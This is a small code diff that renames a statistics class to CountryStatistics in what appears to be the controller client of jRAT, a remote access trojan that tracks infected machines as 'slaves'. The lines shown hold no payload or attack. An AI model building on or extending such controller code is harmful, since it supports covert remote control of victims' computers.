@@ -16,7 +16,7 @@ import se.jrat.client.net.PortListener;
 import se.jrat.client.packets.outgoing.Packet99Encryption;
 import se.jrat.client.settings.ServerID;
 import se.jrat.client.settings.Settings;
-import se.jrat.client.settings.Statistics;
+import se.jrat.client.settings.CountryStatistics;
 import se.jrat.client.ui.frames.Frame;
 import se.jrat.client.ui.panels.PanelMainLog;
 import se.jrat.client.utils.FlagUtils;
@@ -434,7 +434,7 @@ public abstract class AbstractSlave implements Runnable {
 			Frame.mainTable.repaint();
 		}
 		
-		Statistics.getGlobal().add(this);
+		CountryStatistics.getGlobal().add(this);
 	}
 
 	public OperatingSystem getOS() {
